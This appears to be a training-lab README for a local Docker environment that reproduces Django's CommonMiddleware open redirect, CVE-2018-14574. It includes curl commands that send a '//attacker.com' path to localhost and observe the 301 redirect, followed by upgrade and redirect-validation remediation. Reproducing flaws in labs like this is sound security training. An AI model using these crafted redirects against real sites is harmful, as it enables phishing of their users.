# Django CommonMiddleware URL Redirection & Query Injection (CVE-2018-14574)

## Overview

Django is a high-level Python web framework. In Django versions 2.0.x before 2.0.8, 1.11.x before 1.11.15, and 1.8.x before 1.8.19, when CommonMiddleware is enabled with APPEND_SLASH=True, sending a crafted URL with leading slashes (e.g. //example.com) causes Django to issue an open redirect to arbitrary external domains, enabling phishing attacks.

- **Service Access**: `http://localhost:8181/`
- **Default Credentials**: `Unauthenticated URL manipulation`
- **Docker Shortcut**: `./lab start django-trailing-redirect`
- **Container Name**: `cyberlab_02_django_trailing_redirect`
- **RAM Footprint**: ~40M

---

## Exploitation Walkthrough

### 1. Verify Django Web Server Running

```bash
curl -i http://localhost:8181/
```

### 2. Send Request with Double-Slash Domain

```bash
curl -i 'http://localhost:8181//attacker.com'
```

### 3. Observe HTTP 301 Location Header

```bash
# Response returns Location: //attacker.com/ leading browser to external site.
```

---

## Defensive Remediation & Hardening

1. Upgrade Django to version 2.0.8, 1.11.15, or higher.
2. Sanitize redirect target paths and validate against domain whitelists.

---

## Video Walkthroughs & Technical References

- [Cross-Origin Resource Sharing (CORS) | Complete Guide](https://www.youtube.com/watch?v=t5FBwq-kudw)
- [Django Security Release CVE-2018-14574](https://www.djangoproject.com/weblog/2018/aug/01/security-releases/)
- [Vulhub Django Environment](https://vulhub.org/#/environments/django/CVE-2018-14574/)
